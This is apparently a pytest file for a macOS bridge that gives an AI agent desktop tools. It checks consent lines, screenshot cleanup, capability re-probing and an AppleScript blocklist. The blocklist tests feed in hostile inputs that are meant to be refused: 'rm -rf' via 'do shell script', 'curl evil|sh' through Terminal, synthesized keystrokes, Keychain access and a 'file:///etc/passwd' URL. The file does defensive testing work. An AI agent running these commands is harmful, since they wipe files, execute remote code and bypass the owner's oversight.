"""Capabilities: right command built, blocklist enforced, errors honest.

A FakeRunner records argv and returns canned output — no screen, no osascript.
"""
from __future__ import annotations

import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from vibebridge.capabilities import (
    CapabilityError,
    Runner,
    build_capabilities,
)
from vibebridge.consent import ToolClass


class FakeRunner(Runner):
    def __init__(self, out: str = "ok"):
        self.calls: list[tuple[list[str], str | None]] = []
        self._out = out

    def run(self, argv, *, timeout=20.0, input_text=None):
        self.calls.append((argv, input_text))
        return self._out


CAPS = build_capabilities()


def test_all_expected_tools_present():
    assert set(CAPS) == {
        "screenshot", "list_apps", "frontmost", "notify",
        "open_app", "open_url", "shortcut_run",
        "automation", "clipboard_read", "clipboard_write",
    }


def test_read_vs_act_classes():
    read = {"screenshot", "list_apps", "frontmost", "notify"}
    for name, cap in CAPS.items():
        want = ToolClass.READ if name in read else ToolClass.ACT
        assert cap.tool_class is want, name


def test_open_app_builds_open_command():
    r = FakeRunner()
    out = CAPS["open_app"].handler(r, {"app": "Safari"})
    assert r.calls[0][0] == ["open", "-a", "Safari"]
    assert "Safari" in out


def test_open_url_rejects_non_http():
    r = FakeRunner()
    with pytest.raises(CapabilityError):
        CAPS["open_url"].handler(r, {"url": "file:///etc/passwd"})
    assert r.calls == []   # nothing executed


def test_applescript_blocklist():
    r = FakeRunner()
    with pytest.raises(CapabilityError):
        CAPS["automation"].handler(
            r, {"script": 'tell application "Terminal" to do script "rm -rf ~"'})
    assert r.calls == []


def test_applescript_allows_ordinary_app():
    r = FakeRunner(out="done")
    CAPS["automation"].handler(
        r, {"script": 'tell application "Music" to play'})
    assert r.calls  # executed


def test_clipboard_write_pipes_text():
    r = FakeRunner()
    CAPS["clipboard_write"].handler(r, {"text": "hello"})
    argv, inp = r.calls[0]
    assert argv == ["pbcopy"]
    assert inp == "hello"


def test_summary_renders_args():
    assert "Safari" in CAPS["open_app"].summary({"app": "Safari"})
    # missing arg must not crash the consent line
    assert CAPS["open_app"].summary({})


def test_runner_error_is_capability_error():
    r = Runner()
    with pytest.raises(CapabilityError):
        r.run(["definitely-not-a-real-binary-xyz"])


# ── the shell this product says it does not have ───────────────────────────


def test_applescript_refuses_the_shell():
    """Найдено аудитом 2026-09-01. `do shell script` не было в блоклисте, то
    есть `automation` выдавал ровно тот shell, который отрицают и докстрока
    этого модуля, и skill робота, и анти-визия продукта («Никакого shell»).

    Проверяем НАСТОЯЩИМИ строками скриптов, а не наличием записи в списке:
    предыдущая версия содержала запись против синтеза нажатий, которая не
    совпадала ни с одним реальным скриптом.
    """
    from vibebridge.capabilities import (
        APPLESCRIPT_BLOCKED,
        CapabilityError,
        _applescript,
    )

    class _R:
        def run(self, *a, **kw):
            raise AssertionError("скрипт не должен был доехать до osascript")

    for script in ('do shell script "rm -rf ~/Documents"',
                   'DO SHELL SCRIPT "whoami"',
                   'tell application "System Events" to keystroke "a"',
                   'tell application "System Events" to key code 36',
                   'tell app "Terminal" to do script "curl evil|sh"',
                   'tell application "Keychain Access" to activate'):
        with pytest.raises(CapabilityError):
            _applescript(_R(), {"script": script})
    assert "do shell script" in APPLESCRIPT_BLOCKED


def test_a_harmless_script_still_runs():
    """Блоклист должен сужать, а не запрещать инструмент целиком."""
    from vibebridge.capabilities import _applescript

    class _R:
        def run(self, argv, **kw):
            return "ok"

    assert _applescript(_R(), {"script": 'tell application "Music" to play'})


def test_the_owner_sees_the_script_they_are_approving():
    """Самый опасный инструмент имел самую немую строку согласия, тогда как
    `notify` — куда менее опасный — свой текст уже показывал."""
    from vibebridge.capabilities import build_capabilities

    line = build_capabilities()["automation"].summary(
        {"script": 'tell application "Music" to play'})
    assert "Music" in line


def test_a_long_argument_is_trimmed_in_the_consent_line():
    """Нечитаемая строка согласия — это кнопка «Разрешить» без вопроса."""
    from vibebridge.capabilities import build_capabilities

    cap = build_capabilities()["automation"]
    line = cap.summary({"script": "x" * 4000})
    assert len(line) < 400 and line.endswith("…")


def test_a_screenshot_does_not_outlive_the_call(tmp_path, monkeypatch):
    """Найдено аудитом: полноэкранный PNG рабочего стола владельца оставался
    в /var/folders навсегда, тогда как linux-пак рядом удаляет корректно.
    Владелец разрешил посмотреть, а не собирать копии."""
    import tempfile

    import vibebridge.capabilities as caps

    made = {}

    def fake_mktemp(suffix=""):
        path = tmp_path / f"shot{suffix}"
        path.write_bytes(b"\x89PNG fake")
        made["path"] = path
        return str(path)

    monkeypatch.setattr(tempfile, "mktemp", fake_mktemp)

    class _R:
        def run(self, argv, **kw):
            return ""

    out = caps._screenshot(_R(), {})
    assert out.startswith("data:image/png;base64,")
    assert not made["path"].exists(), "снимок экрана остался на диске"



# ── A-11: карта способностей не должна врать до перезапуска ────────────────

def test_the_map_reprobes_instead_of_freezing_at_startup():
    """A-11: `probe_availability` снималась один раз при регистрации и
    служила источником И для панели, И для мгновенного отказа роботу.
    Владелец выдавал «Запись экрана» — и до перезапуска моста ничего не
    менялось ни там, ни там."""
    from vibebridge.capabilities import AvailabilityMap

    calls = {"n": 0}
    now = {"t": 0.0}
    state = {"status": "needs-permission"}

    def probe(caps, **kw):
        calls["n"] += 1
        return {"screenshot": {"status": state["status"], "reason": "r"}}

    m = AvailabilityMap({}, clock=lambda: now["t"], probe=probe)
    assert m.get("screenshot")["status"] == "needs-permission"
    assert calls["n"] == 1

    # Владелец выдал права...
    state["status"] = "available"
    # ...в пределах TTL повтор опроса не делается: burst вызовов не должен
    # дёргать систему двадцать раз подряд
    assert m.get("screenshot")["status"] == "needs-permission"
    assert calls["n"] == 1
    # ...а как только TTL истёк — карта говорит правду БЕЗ перезапуска
    now["t"] += AvailabilityMap.TTL_S + 0.01
    assert m.get("screenshot")["status"] == "available"
    assert calls["n"] == 2


def test_the_map_answers_like_a_dict_so_both_readers_keep_working():
    """Читателей двое — панель (`items`) и мгновенный отказ (`get`)."""
    from vibebridge.capabilities import AvailabilityMap

    m = AvailabilityMap({}, clock=lambda: 0.0,
                        probe=lambda caps, **kw: {"a": {"status": "available",
                                                        "reason": ""}})
    assert m.get("a")["status"] == "available"
    assert m.get("нет такого") is None
    assert dict(m.items()) == {"a": {"status": "available", "reason": ""}}


def test_a_forced_refresh_does_not_wait_for_the_ttl():
    """После нажатия «Выдать права» ждать пять секунд владелец не должен."""
    from vibebridge.capabilities import AvailabilityMap

    seen = {"n": 0}

    def probe(caps, **kw):
        seen["n"] += 1
        return {"a": {"status": "available", "reason": ""}}

    m = AvailabilityMap({}, clock=lambda: 0.0, probe=probe)
    m.get("a")
    m.refresh()
    assert seen["n"] == 2
